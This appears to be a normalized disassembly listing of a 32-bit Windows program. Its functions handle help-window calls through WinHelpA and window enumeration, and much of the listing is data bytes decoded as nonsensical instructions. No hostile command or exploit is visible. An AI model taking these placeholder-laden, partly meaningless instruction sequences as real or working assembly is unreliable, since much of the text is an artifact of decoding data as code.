cmove eax [ eax ]
sub eax 0x300440f
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cmp bh [ edi + ecx + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax + eax ] al
adc [ eax + eax ] al
add [ eax ] al
add [ eax + edx + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0x24004410
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add al bl
xor eax 0x5bd00040
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ ebx + ebx + 0x44 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc al 0x0
add [ eax ] al
jo r-xdata
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441185
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404120
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4041b8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44118c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044a0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4410d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_441185
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404120
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4041b8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44118c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044a0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4411a0
push ebx
mov ebx eax
mov eax ebx
call sub_4414d0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405b50
sub_4411dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441243
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4410d0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44124a
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_441254
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4412dc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4411c8
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044a0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4412e3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_4412ef
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441377
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_441a14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44137e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4410d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4412fc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441377
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_441a14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44137e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4410d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_441384
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44147c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4410d0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092d8
mov eax ebx
call sub_441a14
test al al
je r-xdata
mov ecx sub_440f24
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441483
lea eax [ ebp - 0x1c ]
call sub_404120
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4410d0
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_44196c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404174
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4414ec
push ebx
mov ebx eax
mov eax ebx
call sub_4414d0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405b50
pop ebx
retn
mov eax rw-data
call sub_405b50
sub_44151c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_441574
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44157b
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4410d0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_441584
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44167a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_409298
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4410d0
mov eax ebx
call sub_441a14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441681
lea eax [ ebp - 0x110 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404390
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_44196c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404390
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_441698
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4416fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441701
lea eax [ ebp - 0x8 ]
call sub_404120
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4410d0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_44170c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44178c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4410d0
mov eax ebx
call sub_441a14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441793
lea eax [ ebp - 0x4 ]
call sub_404120
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44196c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44189c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408d10
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4418f7
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408cec
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_44196c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_4419e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_441950
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419e9
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_408180
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4419f8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_441a14
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_441950
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4419f4
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4419f8
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_441a70
sub_441a70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_441aed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4414d0
call GetTickCount
mov ebx eax
push 0x0
call sub_4066d0
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4410d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441af4
lea eax [ ebp - 0x4 ]
call sub_404120
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_441afc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4036f4
call sub_405b68
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_441b44
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_441b70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_441bde
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441be5
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405b50
mov eax rw-data
call sub_405b50
mov eax rw-data
call sub_405b50
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_405b50
mov eax [ rw-data ]
call sub_4411a0
sub_441be8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_441c3a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c41
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_441afc
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405b50
mov edx eax
mov eax [ rw-data ]
call sub_42f410
sub_441c44
dec eax
sbb al 0x44
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
adc [ ebp + 0x44 ] al
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
add [ eax + 0x45 ] ah
inc esp
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add ah bh
inc ebp
inc esp
add ah ch
inc esp
inc esp
add al ch
inc esp
inc esp
add ah ch
inc ebx
inc esp
add [ ebp + eax * 2 + 0x43b00044 ] ah
inc esp
add [ eax * 2 + 0x45080044 ] al
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x1d ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x1d ] si
inc esp
add [ ecx + edx + 0x40 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
sbb al 0x44
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add [ eax ] ah
sbb eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sbb eax 0x340044
jae r-xdata
add [ esi + ebx + r--data ] dh
inc esp
jb r-xdata
add [ eax ] dl
inc ebp
inc esp
add al dl
inc ebp
inc esp
add [ eax + 0x16004445 ] al
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x45700040
inc esp
add [ eax + 0x45 ] ah
inc esp
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0x44 ] al
add [ eax + eax ] dh
jb r-xdata
add [ eax - 0x3ffbfcd ] al
inc ebp
inc esp
add [ eax ] dh
inc esi
inc esp
add al bl
xor eax 0x45700040
inc esp
add [ eax + 0x45 ] ah
add [ eax ] al
js r-xdata
add [ eax ] al
mov ah 0x1e
inc esp
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x441dc4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sbb eax 0x3c0044
add [ eax ] al
aam 0x1c
inc esp
add al bl
xor eax 0x45700040
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
jl r-xdata
inc esp
add [ eax + 0x46 ] cl
inc esp
add ah ch
inc ebx
inc esp
add [ ebp + eax * 2 + 0x43b00044 ] ah
inc esp
add [ esi + eax * 2 + 0x44 ] dl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add ah ch
xor eax 0x35e00040
inc ebp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0xc ] si
push ds
inc esp
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x1c ] bh
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
inc esp
add [ eax + ecx * 2 + 0x44 ] dh
add al ch
inc esp
inc esp
add ah ch
inc ebx
inc esp
add [ edi + eax * 2 ] ch
inc esp
add [ eax + 0x4004443 ] dh
inc ebx
outsd
outsb
je r-xdata
inc ebp
inc esp
add [ esi + eax * 2 + 0x44 ] dh
add al dl
inc ebp
inc esp
add [ eax + 0x14004445 ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x14 ] si
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1f ] al
inc esp
add [ eax ] al
add [ eax ] al
cmp al 0x1e
inc esp
add al bl
xor eax 0x45700040
inc esp
add [ esi + eax * 2 + 0x35ec0044 ] dl
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x3ffbfcd ] al
inc ebp
inc esp
add [ eax ] dh
inc esi
loopne r-xdata
inc esp
jb r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc esp
add al bl
xor eax 0x45700040
inc esp
add [ eax - 0x13ffbbb8 ] cl
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
cld
inc esi
inc esp
add ah bh
inc ebp
inc esp
add [ eax + ecx * 2 + 0x44 ] dh
add al ch
inc esp
inc esp
add ah ch
inc ebx
inc esp
add [ edi + eax * 2 ] ch
inc esp
add [ eax + 0x4004443 ] dh
inc ebp
inc esp
add [ eax ] cl
inc ebp
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 8 + 0x1f ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x1f ] si
inc esp
add [ eax ] cl
push ds
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebp
inc esp
add [ eax ] cl
inc ebp
inc esp
add [ eax ] dl
inc ebp
inc esp
add [ eax - 0x67ffbbb9 ] cl
inc esi
inc esp
add al dl
inc edi
inc esp
add [ eax + ecx * 2 + 0x44 ] cl
add [ eax + 0x48 ] ah
inc esp
add [ eax + 0xf004448 ] al
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
movsb [ edi ] [ esi ]
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop ds
inc esp
add [ eax ] dh
add [ eax ] al
js r-xdata
add [ eax + 0x12004445 ] al
push esp
inc esp
jb r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add ah bh
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
inc ebx
outsd
outsb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax - 0x13ffbbbd ] ch
inc esp
inc esp
add al ch
inc esp
inc esp
add ah ch
inc ebx
inc esp
add [ eax + 0x43 ] dl
inc esp
add [ eax + 0x4004443 ] dh
inc ebp
outsd
insd
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ esi + edi * 2 + 0x7e980042 ] ch
inc edx
add [ edx + ebx * 2 + 0x540e0044 ] al
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
add al 0x21
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and [ eax + eax ] eax
add [ eax ] dl
inc ebp
inc esp
add [ eax - 0x67ffbbb9 ] cl
inc esi
inc esp
add al dl
inc edi
inc esp
add [ eax + ecx * 2 + 0x44 ] cl
add [ eax + 0x48 ] ah
inc esp
add [ eax + 0x11004448 ] al
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add ah bh
inc esi
inc esp
add ah bh
inc ebp
inc esp
add al bl
xor eax 0x45700040
inc esp
add [ eax + 0x45 ] ah
inc esp
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
cld
inc esp
add [ eax + 0x46 ] cl
inc esp
add ah ch
inc ebx
inc esp
add [ ebp + eax * 2 + 0x43b00044 ] ah
inc esp
add [ esi + eax * 2 + 0x44 ] dl
add [ eax ] cl
inc ebp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 + 0x1d ] si
inc esp
add [ eax + 0x1d ] dl
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] cl
inc ebp
add al 0x45
je r-xdata
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ ebx + eax * 2 ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x442068c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700044 ] ah
add [ eax ] al
pop eax
pop ds
inc esp
add [ esi + eax * 2 + 0x44 ] dh
add al dl
inc ebp
inc esp
outsd
insb
jae r-xdata
inc esp
add [ eax ] dl
inc ebp
inc esp
inc esp
add [ eax * 2 + 0x45080044 ] al
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44223890
add [ ebx ] al
or al 0x54
add al ch
xor eax 0x35ec0040
inc eax
add al ah
jae r-xdata
add [ ebp + 0x1e880040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
